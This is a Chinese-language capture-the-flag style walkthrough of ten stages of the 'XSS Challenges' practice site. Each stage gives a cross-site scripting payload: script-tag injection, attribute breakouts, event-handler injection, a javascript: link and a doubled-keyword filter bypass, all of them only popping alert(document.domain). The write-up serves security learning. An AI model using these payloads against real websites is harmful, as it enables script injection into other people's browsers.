# XSS Challenges通关记录
[@长安城第一美](undefined/arnie-rytcr)

网址

[XSS Challenges](https://xss-quiz.int21h.jp/)

## Stage #1（构建 payload）
这个靶场最好在 IE 浏览器，然后叫我们不要做除 xss 以外的攻击，也禁止使用扫描器

如果不会 Hint 是提示，用鼠标滑一下就可以看见提示了

第一关没有什么好说的，直接输入 payload

这个 payload 他是有要求内容为**alert(document.domain)**

```javascript
<script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478026665-08a01c6f-31f4-4861-b604-119a2e56014b.png)

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478217038-1af5975d-777d-4af6-b731-08ba0ef0daee.png)

点击进入下一关

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478226037-b0af5440-1b49-4416-b36b-0f4d1556371d.png)

## Stage #2（闭合 input）
输入 payload 查看源码

```javascript
<script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478709754-1bfb421a-7209-494a-bc69-a32ba99e1568.png)

构建 payload 闭合 value 值

```javascript
"><script>alert(document.domain)</script>
```

## Stage #3（修改 country）
先随便输入 payload 测试

```javascript
<script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478840900-dd86cd3e-d9ea-48a4-a550-6f946228763a.png)

说明我们的插入的代码都没有被输入，其实插入点是旁边的选择国家的导航选项

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728478997360-2921e88f-4038-42e0-b986-366e93b350ee.png)

然后再在搜索框随便输入点搜索即可通关

## Stage #4（修改 hackme）
看起来跟第 3 关差不多

尝试上一关的方法行不通

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728479188485-3a8fd29a-08e5-4c41-a362-54cc80d0717f.png)

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480091811-dd1714d5-14f3-426b-9ac0-41f66354a647.png)

**解决办法**

抓包闭合 p3，添加我们的 payload

```javascript
"><script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480121357-a2958d90-f8f2-4e89-b8bc-f715b504c28f.png)

修改后放行直接通关

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480144911-1e785612-090e-49bf-b022-4041ec6de40b.png)

## Stage #5（修改 maxlength）
一是长度限制，二是闭合前面的value

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480212224-fff6b550-e435-4899-ad7e-9b47923874b7.png)

```javascript
"><script>alert(document.domain)</script>
```

## Stage #6（构造 JS 事件）
先随便试一个

```javascript
"><script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480274795-a66d2d24-e009-4918-a425-c5a4de632508.png)

发现 <>被过滤了  

 换个思路，既然闭合不了那就加个属性：  

```javascript
"onmouseover="alert(document.domain)
```

## Stage #7（空格绕过）
先丢测试语句

```javascript
" οnclick=alert(document.domain) 
```

过滤了双引号

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728480965860-882e957d-a5f4-475f-9f64-c2e78c098ca9.png)

 利用空格闭合掉 value 值然后执行 JS 事件   

```javascript
长安城第一美 onmouseover=alert(document.domain)
```

## Stage #8（JS 伪协议）
 随便输入值发现用值构造了一个 a 链接 

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728481130389-aa9b27fe-b4d3-49e4-a93c-d0eaa6f863af.png)

 在 a 链接标签中通常使用 JS 伪协议来执行 JS 代码  

```javascript
javascript:alert(document.domain)
```

然后点击链接即可通关

## Stage #9（修改 hide）
 这一关是需要 IE 7 环境的，查看 head 可以发现编码不一样  

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728481201091-38af3758-2cff-4eb8-9427-b68c9e63c38b.png)

 因为难得搭环境所以可以直接修改 Hint 标签添加 JS 事件（原本是要用编码绕过的） 

```javascript
onmouseover="alert(document.domain)"
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728481501364-abe259b6-d00f-444c-a7b8-b75dd0ec5bb2.png)

## Stage #10（双写绕过）
 用的 payload 测试发现 domain 被过滤掉了  

```javascript
"><script>alert(document.domain)</script>
```

![](https://cdn.nlark.com/yuque/0/2024/png/48966482/1728481712593-86e59113-e571-413f-bec8-71db65ef179b.png)

发现domain被过滤,那我们肯定试试双写

```javascript
"><script>alert(document.dodomainmain)</script>
```

最后讲一下，如果环境有什么问题，过不了，可以强制通关

直接在控制台**alert(document.domain)**   哈哈哈没想到吧

